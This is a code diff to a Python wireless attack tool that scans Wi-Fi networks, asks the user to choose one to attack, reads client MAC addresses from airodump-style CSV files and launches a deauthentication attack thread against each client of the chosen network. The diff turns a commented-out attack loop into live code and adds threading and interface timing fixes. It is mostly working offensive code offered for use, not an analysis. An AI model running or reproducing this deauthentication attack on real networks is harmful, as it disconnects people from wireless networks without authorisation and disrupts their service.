@@ -5,6 +5,7 @@ import subprocess
 import re
 import time
 import csv
+import threading
 
 # Colors
 light_green = "\033[38;5;120m"
@@ -89,13 +90,13 @@ def set_monitor_mode(inf):
     except Exception as e:
         print(f"{red}[!] Error switching to 'monitor' mode: {e}{reset}")
 
-def check_for_essid(bssid, lst):
-    """Check if an BSSID is already in the list of networks."""
+def check_for_essid(essid, lst):
+    """Check if an ESSID is already in the list of networks."""
     check_status = True
     if len(lst) == 0:
         return check_status
     for item in lst:
-        if bssid in item["BSSID"]:
+        if essid in item["ESSID"]:
             check_status = False
     return check_status
 
@@ -123,14 +124,14 @@ def scan_networks(inf):
         print(f"{red}[!] Scan networks failed: {e}{reset}")
 
 def parse_wifi_networks():
-    """Display a menu of available Wi-Fi networks."""
+    """Display a menu of available Wi-Fi networks and make the choice."""
     active_wireless_networks = list()
     try:
         while True:
             os.system("clear")
             for file_name in os.listdir():
                 fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
-                if ".csv" in file_name:
+                if ".csv" in file_name and file_name.startswith("scan"):
                     with open(file_name) as csv_h:
                         csv_h.seek(0)
                         csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
@@ -139,7 +140,7 @@ def parse_wifi_networks():
                                 pass
                             elif row["BSSID"] == "Station MAC":
                                 break
-                            elif check_for_essid(row["BSSID"], active_wireless_networks):
+                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                 active_wireless_networks.append(row)
  
             print(f"{yellow}[*]{reset} Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
@@ -161,11 +162,6 @@ def parse_wifi_networks():
                 raise ValueError("Invalid choice.")
         except ValueError as e:
             print(f"{red}[!] Error network choice: {e}{reset}")
-
-
-def select_target(networks):
-    """Display network menu and return user's choice."""
-    pass
 
 def get_clients(wifi_ssid, wifi_channel, inter):
     """Capture clients on target network."""
@@ -205,8 +201,11 @@ def restore_managed_mode(inf):
     try:
         print(f"{yellow}[*]{reset} Switching to default 'managed' mode...")
         subprocess.run(["ip", "link", "set", inf, "down"], check=True)
+        time.sleep(2)
         subprocess.run(["iw", inf, "set", "type", "managed"], check=True)
+        time.sleep(1)
         subprocess.run(["ip", "link", "set", inf, "up"], check=True)
+        time.sleep(1)
         subprocess.run(["service", "NetworkManager", "start"], check=True)
         mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
         if "managed" not in mode.lower():
@@ -229,9 +228,39 @@ def main():
     hackchannel = wifi_network_choice["channel"].strip()
     get_clients(hackbssid, hackchannel, inter)
     active_clients = set()
+    threads_started = []
+    excluded_clients = filter_clients()
     
-    #subprocess.run(["airmon-ng", "start", inter, hackchannel])
-    #filter_clients()
+    subprocess.run(["airmon-ng", "start", inter, hackchannel])
+    try:
+        while True:
+            os.system("clear")
+            for file_name in os.listdir():
+                fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
+                if ".csv" in file_name and file_name.startswith("clients"):
+                    with open(file_name) as csv_h:
+                        print(f"{green}[+] Running...{reset}")
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for index, row in enumerate(csv_reader):
+                            if index < 5:
+                                pass
+                            elif row["Station MAC"] in excluded_clients:
+                                pass
+                            else:
+                                active_clients.add(row["Station MAC"])
+
+                print("Station MAC           |")
+                print("______________________|")
+                for item in active_clients:
+                    print(f"{item}")
+                    if item not in threads_started:
+                        threads_started.append(item)
+                        t = threading.Thread(target=deauth_attack, args=[hackbssid, item, inter], daemon=True)
+                        t.start()
+    except KeyboardInterrupt:
+        print("\nStopping Deauth")
+
     restore_managed_mode(inter)
 
 if __name__ == "__main__":
